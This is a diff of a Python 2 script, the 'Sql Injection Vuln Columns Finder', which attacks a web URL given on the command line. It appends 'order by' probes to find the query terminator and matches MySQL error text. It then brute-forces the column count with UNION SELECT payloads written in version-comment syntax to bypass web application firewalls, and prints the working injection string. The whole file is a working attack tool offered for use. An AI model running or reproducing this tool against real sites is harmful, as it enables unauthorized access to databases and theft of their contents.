@@ -20,19 +20,41 @@ from urllib2 import urlopen, URLError, HTTPError
 from urllib import urlopen 
 version = 1
 def showlogo():
+# '''
+#       ______          __           ____                  __                 
+#      / ____/___  ____/ /__        / __ )________  ____ _/ /_____  __________
+#     / /   / __ \/ __  / _ \______/ __  / ___/ _ \/ __ `/ //_/ _ \/ ___/ ___/
+#    / /___/ /_/ / /_/ /  __/_____/ /_/ / /  /  __/ /_/ / ,< /  __/ /  (__  ) 
+#    \____/\____/\__,_/\___/     /_____/_/   \___/\__,_/_/|_|\___/_/  /____/  
+
+# '''
 	print '''
-      ______          __           ____                  __                 
-     / ____/___  ____/ /__        / __ )________  ____ _/ /_____  __________
-    / /   / __ \/ __  / _ \______/ __  / ___/ _ \/ __ `/ //_/ _ \/ ___/ ___/
-   / /___/ /_/ / /_/ /  __/_____/ /_/ / /  /  __/ /_/ / ,< /  __/ /  (__  ) 
-   \____/\____/\__,_/\___/     /_____/_/   \___/\__,_/_/|_|\___/_/  /____/  
-    
-    Sql Injection Vuln Columns Finder 																		
+
+	  _   _   _   _   _   _   _   _   _   _  
+	 / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
+	( v | u | l | n | e | r | a | b | l | e )
+	 \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/  
+	  _   _   _   _   _   _   _   
+	 / \ / \ / \ / \ / \ / \ / \   
+	( c | o | l | u | m | n | s ) 
+	 \_/ \_/ \_/ \_/ \_/ \_/ \_/  
+ 	  _   _   _   _   _   _  
+	 / \ / \ / \ / \ / \ / \ 
+	( f | i | n | d | e | r )
+	 \_/ \_/ \_/ \_/ \_/ \_/ 
+
+	  _   _   _   
+	 / \ / \ / \ 
+	((s | q | l)) 
+	 \_/ \_/ \_/ 
+
+   
+    	Sql Injection Vuln Columns Finder 																		
     						Creator : L0V3R In Myanmar
     						Version : %s
     						''' % version
 def help():
-	print '''	Usage : menu.
+	print '''	Usage : Menu.
 	python %s [OPTION]
 	-t set the target ( Eg, -t http://target.com/index.php?id=1 )
 	-h show this help menu.
@@ -43,40 +65,56 @@ def isonline(target):
 		test = urllib2.urlopen(target)
 	except URLError, e:
 		print 'URLError . . .', e
-		exit()
+		sys.exit(1)
 	except HTTPError, e:
 		print "HTTPError . . .", e
-		exit()
+		sys.exit(1)
+	except KeyboardInterrupt, e:
+		print "KeyboardInterrupt."	
+		sys.exit(1)
 	else:
 		print "Target is Online : ", target
-	return
 
 def check_end_url(target):
 	global end_url
 	end_url = ''
 	# print target
-	normal = len(urllib2.urlopen(target).read())
-	tar = target+' order by 111111111111--'
-	error_normal = len(urllib2.urlopen(tar).read())
-	tar = target+"' order by 111111111111--+--"
-	error_adv = len(urllib2.urlopen(tar).read())
+	normal_page_len = len(urllib2.urlopen(target).read())
+	print "Normal Page Len : " , normal_page_len , "Bytes"
 	
-	if normal != error_normal:
+	tar_nor = target+'+order+by+111111111111--'
+	tar_nor_read = urllib2.urlopen(tar_nor).read()
+	tar_nor_len = len(tar_nor_read)
+	print tar_nor , tar_nor_len , "bytes"
+	
+	tar_adv = target+"'+order+by+111111111111--+--"
+	tar_adv_read = urllib2.urlopen(tar_adv).read()
+	tar_adv_len = len(tar_adv_read)
+	print tar_adv , tar_adv_len , "bytes"
+	print ' '
+	if "Unknown column '111111111111' in 'order clause'" in tar_nor_read:
 		end_url = '--'
-	elif normal != error_adv:
+	elif "Unknown column '111111111111' in 'order clause'" in tar_adv_read:
 		end_url = '--+--'
 	else:
 		end_url = '#'
-	return end_url
-def find_columns(target,end_url = '--%20--'):
+	# if normal_page_len != tar_nor_len:
+	# 	end_url = '--'
+	# elif normal_page_len != tar_adv_len:
+	# 	end_url = '--+--'
+	# else:
+	# 	end_url = '#'
+	# return end_url
+def find_columns(target,end_url):
 	number_of_column = 1
 	# union_select = "+AND+'1'='2'+UNION+SELECT+"
 	# union_select = "+AND+1=2+UNION+SELECT+"
 	union_select = "+AND+'1'='2'+/*!50000union*/+/*!50000select*/+" # to bypass WAF.
-	find_message = "0x"+"L0V3R !N MY@NM@R".encode('hex') #You can change the message "L0V3R !N MY@NM@R"
+	find_message = "0x"+"L0V3R !N MY@NM@R".encode('hex') # Do not change!
 	column_insert = ','
-
 	finding_url = target+union_select+find_message
+	if end_url == '--+--':
+		finding_url = target+"'"+union_select+find_message	
 	for_finding_columns = target+union_select+str(number_of_column * 111111)
 	print "Finding The Column Numbers in ", target
 	sys.stdout.write("Guessing Columns : ")
@@ -122,9 +160,10 @@ def find_columns(target,end_url = '--%20--'):
 				for_finding_columns = for_finding_columns+end_url
 				print "\nPayload >>>" , for_finding_columns
 				print "\nThanks You. :D"
-
+				sys.exit(1)
 			else:
 				print "nothing!."
+				sys.exit(1)
 			exit()
 
 		number_of_column += 1
@@ -137,6 +176,7 @@ def find_columns(target,end_url = '--%20--'):
 		for_finding_columns += column_insert
 		#to add columns
 		for_finding_columns += str(number_of_column * 111111)
+	sys.exit(1)
 if __name__ == '__main__':
 	if len(sys.argv) <= 1 or '-h' in sys.argv:
 		showlogo()
@@ -146,7 +186,7 @@ if __name__ == '__main__':
 		try:
 			target = sys.argv[2]
 			showlogo()
-			isonline(target)
+			# isonline(target)
 			check_end_url(target)
 			find_columns(target,end_url)
 
